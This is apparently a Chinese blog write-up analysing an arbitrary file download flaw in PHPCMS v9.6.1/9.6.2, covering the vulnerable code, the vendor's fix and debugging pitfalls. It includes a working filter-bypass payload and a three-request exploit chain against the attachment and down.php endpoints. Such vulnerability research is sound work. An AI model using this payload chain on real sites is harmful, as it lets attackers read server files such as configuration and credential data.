+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">$a_k</span> <span class="o">=</span> trim<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;a_k&#39;</span><span class="o">])</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$pc_auth_key</span> <span class="o">=</span> md5<span class="o">(</span>pc_base::load_config<span class="o">(</span><span class="s1">&#39;system&#39;</span>,<span class="s1">&#39;auth_key&#39;</span><span class="o">)</span>.<span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="o">]</span>.<span class="s1">&#39;down&#39;</span><span class="o">)</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$a_k</span> <span class="o">=</span> sys_auth<span class="o">(</span><span class="nv">$a_k</span>, <span class="s1">&#39;DECODE&#39;</span>, <span class="nv">$pc_auth_key</span><span class="o">)</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="o">(</span>empty<span class="o">(</span><span class="nv">$a_k</span><span class="o">))</span> showmessage<span class="o">(</span>L<span class="o">(</span><span class="s1">&#39;illegal_parameters&#39;</span><span class="o">))</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">unset<span class="o">(</span><span class="nv">$i</span>,<span class="nv">$m</span>,<span class="nv">$f</span>,<span class="nv">$t</span>,<span class="nv">$ip</span><span class="o">)</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$a_k</span> <span class="o">=</span> safe_replace<span class="o">(</span><span class="nv">$a_k</span><span class="o">)</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">parse_str<span class="o">(</span><span class="nv">$a_k</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">//这里有没有很熟悉，和上篇 SQL 注入的实现方法几乎一致</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>但这里 sys_auth 密钥不再是默认密钥了，而是特定的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><msub><mi>c</mi><mi>a</mi></msub><mi>u</mi><mi>t</mi><msub><mi>h</mi><mi>k</mi></msub><mi>e</mi><mi>y</mi><mo>=</mo><mi>m</mi><mi>d</mi><mn>5</mn><mo stretchy="false">(</mo><mi>p</mi><msub><mi>c</mi><mi>b</mi></msub><mi>a</mi><mi>s</mi><mi>e</mi><mo>:</mo><mo>:</mo><mi>l</mi><mi>o</mi><mi>a</mi><msub><mi>d</mi><mi>c</mi></msub><mi>o</mi><mi>n</mi><mi>f</mi><mi>i</mi><mi>g</mi><msup><mo stretchy="false">(</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi>s</mi><mi>y</mi><mi>s</mi><mi>t</mi><mi>e</mi><msup><mi>m</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><msup><mo separator="true">,</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi>a</mi><mi>u</mi><mi>t</mi><msub><mi>h</mi><mi>k</mi></msub><mi>e</mi><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">pc_auth_key = md5(pc_base::load_config(&#x27;system&#x27;,&#x27;auth_key&#x27;).</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">ey</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">d</span><span class="mord">5</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mord mathnormal">se</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">::</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal">a</span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen"><span class="mopen">(</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">sys</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct"><span class="mpunct">,</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">.</span></span></span></span>_SERVER[&lsquo;HTTP_USER_AGENT&rsquo;].&lsquo;down&rsquo;);
+显然这里不能单单依靠 attachments.php::swfupload_json() 获取加密字符串，swfupload_json() 类方法使用的还是默认密钥
+看 down.php::init() 76-84 行</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">public function init() {
+</span></span><span class="line"><span class="cl">	if(strpos($f, &#39;http://&#39;) !== FALSE || strpos($f, &#39;ftp://&#39;) !== FALSE || strpos($f, &#39;://&#39;) === FALSE) {  
+</span></span><span class="line"><span class="cl">	    $pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);  
+</span></span><span class="line"><span class="cl">	    $a_k = urlencode(sys_auth(&#34;i=$i&amp;d=$d&amp;s=$s&amp;t=&#34;.SYS_TIME.&#34;&amp;ip=&#34;.ip().&#34;&amp;m=&#34;.$m.&#34;&amp;f=$f&amp;modelid=&#34;.$modelid, &#39;ENCODE&#39;, $pc_auth_key));  
+</span></span><span class="line"><span class="cl">	    $downurl = &#39;?m=content&amp;c=down&amp;a=download&amp;a_k=&#39;.$a_k;  
+</span></span><span class="line"><span class="cl">	} else {  
+</span></span><span class="line"><span class="cl">	    $downurl = $f;         
+</span></span><span class="line"><span class="cl">	}  
+</span></span><span class="line"><span class="cl">	include template(&#39;content&#39;,&#39;download&#39;);
+</span></span><span class="line"><span class="cl">		</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>phpcms 项目中只有这里密钥能符合，这里加密完后拼接进 <span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to &#x27;error&#x27;: Unicode text character &quot;然&quot; used in math mode [unicodeTextInMathMode] at position 5: a_k 然̲后赋值给 " style="color:#ff4949">a_k 然后赋值给 </span>downurl，加密字符串就存放在 <span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to &#x27;error&#x27;: Unicode text character &quot;中&quot; used in math mode [unicodeTextInMathMode] at position 9: downurl 中̲。那么问题来了，如何拿到 " style="color:#ff4949">downurl 中。那么问题来了，如何拿到 </span>downurl？
+看最后的模板类方法 template()</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">include template(&#39;content&#39;,&#39;download&#39;);
+</span></span><span class="line"><span class="cl">function template($module = &#39;content&#39;, $template = &#39;index&#39;, $style = &#39;&#39;) {
+</span></span><span class="line"><span class="cl">	  =&gt;
+</span></span><span class="line"><span class="cl">		if(strpos($module, &#39;plugin/&#39;)!== false) {
+</span></span><span class="line"><span class="cl">		}
+</span></span><span class="line"><span class="cl">		if(!empty($style) &amp;&amp; preg_match(&#39;/([a-z0-9\-_]+)/is&#39;,$style)) {
+</span></span><span class="line"><span class="cl">		} elseif (empty($style) &amp;&amp; !defined(&#39;STYLE&#39;)) {
+</span></span><span class="line"><span class="cl">			if(defined(&#39;SITEID&#39;)) {
+</span></span><span class="line"><span class="cl">			} else {
+</span></span><span class="line"><span class="cl">			}
+</span></span><span class="line"><span class="cl">			if(!empty($siteid)) {
+</span></span><span class="line"><span class="cl">			}
+</span></span><span class="line"><span class="cl">		} elseif (empty($style) &amp;&amp; defined(&#39;STYLE&#39;)) {
+</span></span><span class="line"><span class="cl">		} else {
+</span></span><span class="line"><span class="cl">		}
+</span></span><span class="line"><span class="cl">		$compiledtplfile = PHPCMS_PATH.&#39;caches&#39;.DIRECTORY_SEPARATOR.&#39;caches_template&#39;.DIRECTORY_SEPARATOR.$style.DIRECTORY_SEPARATOR.$module.DIRECTORY_SEPARATOR.$template.&#39;.php&#39;;
+</span></span><span class="line"><span class="cl">		//定义模板文件路径
+</span></span><span class="line"><span class="cl">		...
+</span></span><span class="line"><span class="cl">		return $compiledtplfile;
+</span></span><span class="line"><span class="cl">		//返回视图到前端
+</span></span><span class="line"><span class="cl">}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>init() 执行的末尾调用了模板引擎，template() 会返回模板文件 caches/caches_template/default/content/download.php
+文件内容中赫然是 echo $downurl!
+<figure>
+  <img src="file-20250731223058153.png" alt="" loading="lazy"></figure>
+
+攻击链已完整：先把 Payload 给 attachments.php::swfupload_json() 从而获取默认密钥加密后的字符串，然后发给 down.php::init()，上篇文章分析过，init() 的开头也调用了 sys_auth，能解密默认密钥的字符串，然后返回的模板文件中得到带有特定密钥加密后的字符串，最后发给 down,php::download，触发任意文件下载漏洞
+最后是绕过，需要将每一个加解密、safe_replace 都考虑到，才能保证 Payload 到最后是 index.php
+Payload 在程序中一共经历三次 safe_replace</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">//phpcms/libs/functions/global.func.php
+</span></span><span class="line"><span class="cl">function safe_replace($string) {  
+</span></span><span class="line"><span class="cl">    $string = str_replace(&#39;%20&#39;,&#39;&#39;,$string);  
+</span></span><span class="line"><span class="cl">    $string = str_replace(&#39;%27&#39;,&#39;&#39;,$string);  
+</span></span><span class="line"><span class="cl">    $string = str_replace(&#39;%2527&#39;,&#39;&#39;,$string);  
+</span></span><span class="line"><span class="cl">    $string = str_replace(&#39;*&#39;,&#39;&#39;,$string);  
+</span></span><span class="line"><span class="cl">    $string = str_replace(&#39;&#34;&#39;,&#39;&amp;quot;&#39;,$string);  
+</span></span><span class="line"><span class="cl">    $string = str_replace(&#34;&#39;&#34;,&#39;&#39;,$string);  
+</span></span><span class="line"><span class="cl">    $string = str_replace(&#39;&#34;&#39;,&#39;&#39;,$string);  
+</span></span><span class="line"><span class="cl">    $string = str_replace(&#39;;&#39;,&#39;&#39;,$string);  
+</span></span><span class="line"><span class="cl">    $string = str_replace(&#39;&lt;&#39;,&#39;&amp;lt;&#39;,$string);  
+</span></span><span class="line"><span class="cl">    $string = str_replace(&#39;&gt;&#39;,&#39;&amp;gt;&#39;,$string);  
+</span></span><span class="line"><span class="cl">    $string = str_replace(&#34;{&#34;,&#39;&#39;,$string);  
+</span></span><span class="line"><span class="cl">    $string = str_replace(&#39;}&#39;,&#39;&#39;,$string);  
+</span></span><span class="line"><span class="cl">    $string = str_replace(&#39;\\&#39;,&#39;&#39;,$string);  
+</span></span><span class="line"><span class="cl">    return $string;  
+</span></span><span class="line"><span class="cl">}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>这个过滤没起到正确的效果，通过 *、%20 夹在 index.p(这里)hp 中的方式，绕过后面 down.php::download() 的黑名单
+具体过程如下</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Payload：p%3%2*520Chp (另一种为p%3%25252%2*70Chp，被替换的次数更多，我自己编的更简单)
+</span></span><span class="line"><span class="cl">1. 浏览器URLDecode：index.p%3%2*520Chp
+</span></span><span class="line"><span class="cl">2. attachments.php::swfupload_json()  241行 safe_replace：index.p%3%2520Chp
+</span></span><span class="line"><span class="cl">3. down.php::init() 17行 safe_replace：index.p%3%2520Chp
+</span></span><span class="line"><span class="cl">4. down.php::init() 18行 parse_str：index.p%3%2520Chp
+</span></span><span class="line"><span class="cl">5. down.php::download() 93行 safe_replace：index.p%3%20Chp
+</span></span><span class="line"><span class="cl">6. down.php::download() 94行 parse_str：index.p%3Chp
+</span></span><span class="line"><span class="cl">7. down.php::download() 126行 str_replace：index.p&lt;hp</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><h3 class="heading-element" id="漏洞验证"><span>漏洞验证</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e9%aa%8c%e8%af%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>先登录会员中心，拿到 userid，然后向 attachments::swfupload_json() 发包</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;src=%26d%3D1%26catid%3D1%26i%3D1%26m%3D1%26modelid%3D1%26s%3Dindex%26f%3D.p%3%2*520Chp</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250801093156002.png" alt="" loading="lazy"></figure>
+
+拿到 att_json 后向 down.php::init 发包</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/index?m=content&amp;c=down&amp;a=init&amp;a_k=3d5akZ8EgKHLWdpKWXCXywu9lBZxuH2lU82M9GCa0KDpnwB1DRgjOPg6Hw_e8vsyLZXPlfjTktnmq6vcc94ylMlECv0clp7J9Cx5TZfJYE2Ksl4AEn8O86fYJSYuHH5jwad9ZVkQqli7xqsAuvzA_th8</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250801093454436.png" alt="" loading="lazy"></figure>
+
+拿到加密字符串后向 down.php::download 发包,，完成任意文件读取漏洞利用</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/index.php?m=content&amp;c=down&amp;a=download&amp;a_k=b34foiNn9-b0XL_RQFoQVn4d39BkMef_ou81PHlAjk0j9IThtOW1NrCBgC1BDx6qW1W80WZleWvUpJvu5MhwyVqnMGyor5pFmm3qBZvRfXI1D2p6ey8gs_mdzwB6jbjPc6n9SPO2</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250801093604898.png" alt="" loading="lazy"></figure>
+</p>
+<h2 class="heading-element" id="v962"><span>v9.6.2</span>
+  <a href="#v962" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>v9.6.2 据网上是说仍有绕过方法，但实际测试发现不行，也许和 win11 的解析有关，漏洞是几年前的，现在 windows 更新了导致无法绕过（猜测，因为绕过失败了）
+官方修复点
+attachments::upload_json 去掉了 safe_replace
+<figure>
+  <img src="file-20250801110752645.png" alt="" loading="lazy"></figure>
+
+修复方式简单粗暴，在 file_down 和 str_replace 中间又加了一次黑名单校验
+<figure>
+  <img src="file-20250801110931453.png" alt="" loading="lazy"></figure>
+</p>
+<h1 class="heading-element" id="坑点"><span>坑点</span>
+  <a href="#%e5%9d%91%e7%82%b9" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>逻辑理清楚就比较简单，但在似懂非懂时就很难受。这个绕过 Payload 测了我一个下午，就想不通 Payload 在传递时为什么会出现非预期的状况（也许是脑子生锈了），下面说一下坑点</p>
+<p>坑点一，parse_str 是会默认自动进行 URL 解码，这是它的内置行为，当时不了解，写出来和预期不符合，找不到问题，调试后发现是 parse_str 这里自动解码了，所以还得考虑这个函数的解码影响</p>
+<p>坑点二，Cookie 中设置的 att_json 会默认留存，这会影响程序运行，在 swfupload_json() 中有这样一串代码，静态调用 param 类的类方法 get_cookie() 并赋值给 <span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to &#x27;error&#x27;: Unicode text character &quot;跟&quot; used in math mode [unicodeTextInMathMode] at position 47: …094439288.png)
+跟̲进看看
+get_cookie …" style="color:#ff4949">att_arr_exist
+![](file-20250801094439288.png)
+跟进看看
+get_cookie 的功能一目了然，获取 Cookie 中 att_json 的值并返回，随后会将 </span>att_arr_exist 与 <span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to &#x27;error&#x27;: Unicode text character &quot;拼&quot; used in math mode [unicodeTextInMathMode] at position 10: json_str 拼̲接，如果测试时 Cookie …" style="color:#ff4949">json_str 拼接，如果测试时 Cookie 中 att_json 设置的是上一次错误的 Payload，那么下一次调试时 parse_str 注册的变量就是上一次的 Payload，改进后的 Payload 因为 </span>json_str 在后的原因被覆盖掉了</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">//phpcms/libs/classes/param.class.php
+</span></span><span class="line"><span class="cl">public static function get_cookie($var, $default = &#39;&#39;) {  
+</span></span><span class="line"><span class="cl">    $var = pc_base::load_config(&#39;system&#39;,&#39;cookie_pre&#39;).$var;  
+</span></span><span class="line"><span class="cl">    $value = isset($_COOKIE[$var]) ? sys_auth($_COOKIE[$var], &#39;DECODE&#39;) : $default;  
+</span></span><span class="line"><span class="cl">    if(in_array($var,array(&#39;_userid&#39;,&#39;userid&#39;,&#39;siteid&#39;,&#39;_groupid&#39;,&#39;_roleid&#39;))) {  
+</span></span><span class="line"><span class="cl">       $value = intval($value);  
+</span></span><span class="line"><span class="cl">    } elseif(in_array($var,array(&#39;_username&#39;,&#39;username&#39;,&#39;_nickname&#39;,&#39;admin_username&#39;,&#39;sys_lang&#39;))) { //  site_model auth  
+</span></span><span class="line"><span class="cl">       $value = safe_replace($value);  
+</span></span><span class="line"><span class="cl">    }  
+</span></span><span class="line"><span class="cl">    return $value;  
+</span></span><span class="line"><span class="cl">}</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>PS.多读多练，一位友人去年拿过 Dedecms 的 CVE，实名羡慕，梦想也独立挖一个开源 CMS 的 CVE</p>
+</div><div id="comments"><div id="giscus" class="comment">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="L1nq0/L1nq0.github.io"
+            data-repo-id="R_kgDOSLdcIg"
+            data-category="Announcements"
+            data-category-id="DIC_kwDOSLdcIs4DA03P"
+            data-mapping="pathname"
+            data-strict="0"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="zh-CN"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div><div class="post-footer" id="post-footer"><ul class="post-footer-tags"><li class="post-footer-tag-item">
+          <a href="/tags/files-download/" class="post-footer-tag-link" title="Tags - Files Download">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-tag-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9l14 0"/><path d="M5 15l14 0"/><path d="M11 4l-4 16"/><path d="M17 4l-4 16"/></svg>
+            <span>Files Download</span>
+          </a>
+        </li></ul><div class="post-footer-share">
+    <span class="post-footer-share-label">Share this post on:</span>
+    <div class="post-footer-share-links"><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="https://sw1mblu3.fun/posts/phpcmsv9-6-1-2-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-title="PHPCMSv9.6.1-2 任意文件下载漏洞分析" data-via="map[icon:map[angellist: bandcamp: behance: bilibili: bitbucket: bluesky: buymeacoffee: class:fa-brands fa-x-twitter codepen: credly: csdn: deviantart: devto: diaspora: discord: discordinvite: douban: douyin: dribbble: facebook: feishu: fivehundredpx: flickr: foursquare: freecodecamp: gitea: gitlab: goodreads: googlescholar: hackernews: hackthebox: instagram: jsfiddle: kaggle: keybase: kickstarter: ko-fi: lastfm: liberapay: lichess: linktree: mastodon: matrix: mediawiki: medium: mix: odnoklassniki: orcid: patreon: paypal: phone: pinterest: pleroma: plume: qq: qqgroup: quora: reddit: researchgate: rootme: skype: slidershare: snapchat: soundcloud: spotify: stackoverflow: steam: strava: telegram: thingiverse: tiktok: tryhackme: tumblr: twitch: vine: vk: weibo: whatsapp: wordpress: xing: xmpp: youtubechannel: 